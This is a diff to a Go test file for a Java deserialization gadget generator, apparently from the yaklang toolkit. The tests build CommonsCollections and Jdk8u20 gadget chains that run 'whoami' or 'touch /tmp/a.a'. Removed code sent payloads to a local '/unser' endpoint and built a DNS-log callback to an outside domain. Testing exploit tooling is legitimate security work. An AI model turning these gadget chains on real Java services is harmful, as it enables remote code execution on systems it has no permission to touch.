@@ -3,50 +3,11 @@ package yso
 import (
 	"fmt"
 	"github.com/yaklang/yaklang/common/javaclassparser"
-	"github.com/yaklang/yaklang/common/utils/lowhttp"
 	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
 	"github.com/yaklang/yaklang/common/yserx"
-	"os"
 	"testing"
 )
 
-func SendPayload(payload []byte, opts ...lowhttp.LowhttpOpt) []byte {
-	opts = append(opts, lowhttp.WithPacketBytes(append([]byte("GET /unser HTTP/1.1\nHost: 127.0.0.1:8081\n\n"), payload...)))
-	rsp, err := lowhttp.HTTP(opts...)
-	if err != nil {
-		panic(err)
-	}
-	return rsp.RawPacket
-}
-
-func TestParseCC6(t *testing.T) {
-	content, err := os.ReadFile("/Users/z3/Downloads/payload1.ser")
-	if err != nil {
-		t.Fatal(err)
-	}
-	content4, err := os.ReadFile("/Users/z3/Downloads/payload4.ser")
-	if err != nil {
-		t.Fatal(err)
-	}
-	serxs, err := yserx.ParseJavaSerialized(content)
-	ser := serxs[0]
-	serxs4, err := yserx.ParseJavaSerialized(content4)
-	ser4 := serxs4[0]
-	var transformInPayload4 yserx.JavaSerializable
-	WalkJavaSerializableObject(ser4, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
-		if desc.Detail.ClassName == "org.apache.commons.collections.functors.ChainedTransformer" {
-			transformInPayload4 = objSer
-		}
-	})
-	_ = transformInPayload4
-	WalkJavaSerializableObject(ser, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
-		if desc.Detail.ClassName == "org.apache.commons.collections.functors.ChainedTransformer" {
-			replace(transformInPayload4)
-		}
-	})
-	byts := yserx.MarshalJavaObjects(ser)
-	os.WriteFile("/Users/z3/Downloads/_payload1.ser", byts, 0777)
-}
 func TestGenerateGadgetByGadgetName(t *testing.T) {
 	gadget, err := GenerateGadget("CommonsCollections1", SetTransformChainType("raw_cmd", "touch /tmp/a.a"))
 	if err != nil {
@@ -58,39 +19,22 @@ func TestGenerateGadgetByGadgetName(t *testing.T) {
 	}
 	println(codec.EncodeBase64(ser))
 }
-func TestGenerateGadgetByClassLoader(t *testing.T) {
-	classObj, err := GenDnslogClassObject("gqlxsqfoja.dgrh3.cn")
-	if err != nil {
-		t.Fatal(err)
-	}
-	classBytesCode, err := ToBytes(classObj)
-	if err != nil {
-		t.Fatal(err)
-	}
-	//println(codec.EncodeBase64(classBytesCode))
-	cfg, err := ConfigJavaObject("CommonsCollections2", SetClassBytes(classBytesCode))
-	if err != nil {
-		t.Fatal(err)
-	}
-	ser, err := ToBytes(cfg)
-	if err != nil {
-		t.Fatal(err)
-	}
-	println(codec.EncodeBase64(ser))
-}
 func TestGenerateGadget(t *testing.T) {
 	YsoConfigInstance, err := getConfig()
 	if err != nil {
 		t.Fatal(err)
 	}
 	for name, gadget := range YsoConfigInstance.Gadgets {
-		if gadget.IsTemplate {
-			_, err = ConfigJavaObject(name)
+		if name != "Jdk8u20" {
+			continue
+		}
+		if gadget.IsTemplateImpl {
+			_, err = GenerateGadget(name, SetRuntimeExecEvilClass("whoami"))
 			if err != nil {
 				t.Fatal(err)
 			}
 		} else {
-			gadget, err := setCommandForRuntimeExecGadget(name, "whoami")
+			gadget, err := GenerateGadget(name, SetTransformChainType("raw_cmd", "whoami"))
 			if err != nil {
 				t.Fatal(err)
 			}
